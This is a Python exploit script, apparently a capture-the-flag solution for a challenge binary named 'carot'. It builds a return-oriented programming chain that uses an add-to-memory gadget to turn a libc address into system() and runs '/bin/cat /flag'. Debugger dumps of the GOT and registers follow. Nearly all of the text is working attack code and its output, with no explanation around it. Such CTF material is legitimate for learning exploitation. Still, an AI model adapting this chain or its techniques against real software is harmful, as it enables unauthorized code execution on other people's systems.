#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *

exe  = context.binary = ELF('./carot')
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 11451)


gdbscript = '''
tbreak main
continue
'''.format(**locals())

def arb_write(addr, string):
	string=string+b"\x00"*(8-(len(string)%8))
	a=seperate(string, 4)
	j=0
	payload = b""
	for i in a:
		payload += _3d_write(addr+j, i.ljust(8, b"\x00"))
		j=j+4
	return payload

def _3d_write(addr,value):
	tmp = flat([

		0x4019f2, # pop rbx, rbp, r[12 13 14 15]
		value,
		addr+0x3d,
		p(0)*4,
		_3d_gadget

	])
	return tmp

libc=SetupLibcELF()
io = start()

R = Rootkit(io)

mov_rax_rbp = 0x4014bd #    mov rax,QWORD PTR [rbp-0x8]; add rsp,0x10; ret
_3d_gadget = 0x4011c8 #    add [rbp-0x3d], ebx; nop [rax+rax]; ret; 
mov_rbp_rax = 0x401902 # : mov [rbp-0x8], rax; mov rax, [rbp-0x8]; add rsp, 0x250; pop rbp; ret;

header = b"HTTP GET\x00PPPPPPP" + b"\x00"*512
bss=0x404040
system = bss+0xe80

rop=flat([

	header,
	
	# put a libc address at bss
	exe.sym['__libc_start_main']+8, # rbp
	mov_rax_rbp,
	p(0)*3,
	pop("rbp", system+8),
	mov_rbp_rax,
	b"\x00"*0x250, p(0xdeadbeef), 

	# write /bin/sh to bss
	arb_write(bss+0x10, b"/bin/cat /flag\x00"),

	# make system; system = __libc_start_main + 0x2e450
	_3d_write(system, p(0x2e450)),

	# call system("/bin/sh -c '/bin/cat /flag'")
	_3d_write(system-8, bss+0x10),
	_3d_write(system-16, gadget("pop rdi; ret")),
	0x000000004019f5, # pop rsp
	system-24-16, # rsp

])
sl(rop)
assert len(rop) < 4096
io.interactive()

"""
[0x403f88] free@GLIBC_2.2.5 -> 0x7fd4c4cca850 (free) ◂— endbr64 
[0x403f90] strcasecmp@GLIBC_2.2.5 -> 0x7fd4c4db5030 ◂— endbr64 
[0x403f98] strlen@GLIBC_2.2.5 -> 0x7fd4c4db8660 ◂— endbr64 
[0x403fa0] setbuf@GLIBC_2.2.5 -> 0x7fd4c4cbbc50 (setbuf) ◂— endbr64 
[0x403fa8] printf@GLIBC_2.2.5 -> 0x7fd4c4c91e10 (printf) ◂— endbr64 
[0x403fb0] strrchr@GLIBC_2.2.5 -> 0x7fd4c4db8490 ◂— endbr64 
[0x403fb8] memset@GLIBC_2.2.5 -> 0x7fd4c4dbba90 ◂— endbr64 
[0x403fc0] memcmp@GLIBC_2.2.5 -> 0x7fd4c4db4c50 ◂— endbr64 
[0x403fc8] strcmp@GLIBC_2.2.5 -> 0x7fd4c4db3b60 ◂— endbr64 
[0x403fd0] getchar@GLIBC_2.2.5 -> 0x7fd4c4cbb6e0 (getchar) ◂— endbr64 
[0x403fd8] __isoc99_scanf@GLIBC_2.7 -> 0x7fd4c4c93230 (__isoc99_scanf) ◂— endbr64 
[0x403fe0] fwrite@GLIBC_2.2.5 -> 0x7fd4c4cb3480 (fwrite) ◂— endbr64 
[0x403fe8] strdup@GLIBC_2.2.5 -> 0x7fd4c4ccf4f0 (strdup) ◂— endbr64 

*RAX  0x0
 RBX  0x4019a0 (__libc_csu_init) ◂— push   r15
*RCX  0x30000f01
*RDX  0x7ffcc0e00b40 ◂— 'HTTP GET'
*RDI  0x7ffcc0e005c0 ◂— 0x0
*RSI  0xa
*R8   0x1
*R9   0x1
*R10  0x7fd4c4e18be0 —▸ 0x21582a0 ◂— 0x0
*R11  0x246
 R12  0x401100 (_start) ◂— xor    ebp, ebp
 R13  0x7ffcc0e00e60 ◂— 0x1
 R14  0x0
 R15  0x0
*RBP  0xdeadbeef
*RSP  0x7ffcc0e00d60 —▸ 0x7ffcc0e00e00 —▸ 0x7ffcc0e00e68 —▸ 0x7ffcc0e011f2 ◂— '/home/init0/share/bkup/CTF/ACSC-21/CArot/carot'
*RIP  0xcafebabe

"""